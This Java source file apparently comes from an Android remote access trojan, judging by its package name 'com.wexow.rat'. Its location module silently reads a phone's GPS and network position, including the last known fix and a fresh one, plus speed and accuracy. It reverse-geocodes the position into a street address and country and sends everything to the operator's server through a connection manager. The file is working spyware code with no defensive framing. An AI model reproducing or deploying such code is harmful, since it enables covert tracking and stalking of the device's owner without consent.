package com.wexow.rat.managers;

import android.content.Context;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import java.util.List;
import java.util.Locale;

import com.wexow.rat.core.ConnectionManager;

public class LocManager {
    private static final String TAG = "LocManager";

    public static void getLocation(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    final LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                    if (locationManager == null) return;

                    // 1. Send last known location immediately
                    Location lastKnown = null;
                    try {
                        Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        
                        if (gpsLoc != null && netLoc != null) {
                            lastKnown = (gpsLoc.getAccuracy() < netLoc.getAccuracy()) ? gpsLoc : netLoc;
                        } else {
                            lastKnown = (gpsLoc != null) ? gpsLoc : netLoc;
                        }
                    } catch (SecurityException ignored) {}

                    if (lastKnown != null) {
                        sendLocation(context, lastKnown, "LastKnown");
                    }

                    // 2. Request fresh updates on a thread with a Looper
                    if (Looper.myLooper() == null) {
                        Looper.prepare();
                    }
                    
                    final Handler timeoutHandler = new Handler();
                    final LocationListener locationListener = new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {
                            sendLocation(context, location, "Fresh");
                            // Remove updates after first fresh one to save battery
                            try {
                                locationManager.removeUpdates(this);
                                timeoutHandler.removeCallbacksAndMessages(null);
                                Looper.myLooper().quit();
                            } catch (Exception e) { e.printStackTrace(); }
                        }
                        @Override
                        public void onStatusChanged(String provider, int status, Bundle extras) {}
                        @Override
                        public void onProviderEnabled(String provider) {}
                        @Override
                        public void onProviderDisabled(String provider) {}
                    };

                    // Timeout to stop searching if no location is found in 30 seconds
                    timeoutHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                locationManager.removeUpdates(locationListener);
                                Looper.myLooper().quit();
                            } catch (Exception ignored) {}
                        }
                    }, 30000);

                    try {
                        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
                        }
                        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
                        }
                    } catch (SecurityException e) {
                        Log.e(TAG, "SecurityException: " + e.getMessage());
                    }
                    
                    Looper.loop();

                } catch (Exception e) {
                    Log.e(TAG, "Error getting location: " + e.getMessage());
                }
            }
        }).start();
    }

    private static void sendLocation(Context context, Location location, String status) {
        try {
            JSONObject res = new JSONObject();
            res.put("type", "location");
            res.put("lat", location.getLatitude());
            res.put("lng", location.getLongitude());
            res.put("accuracy", location.getAccuracy());
            res.put("speed", location.getSpeed());
            res.put("provider", location.getProvider());
            res.put("status", status);
            res.put("time", location.getTime());

            // Reverse Geocoding
            try {
                Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                if (addresses != null && !addresses.isEmpty()) {
                    Address address = addresses.get(0);
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i <= address.getMaxAddressLineIndex(); i++) {
                        sb.append(address.getAddressLine(i)).append(i < address.getMaxAddressLineIndex() ? ", " : "");
                    }
                    res.put("address", sb.toString());
                    res.put("country", address.getCountryName());
                }
            } catch (Exception ignored) {}

            ConnectionManager.send(res.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
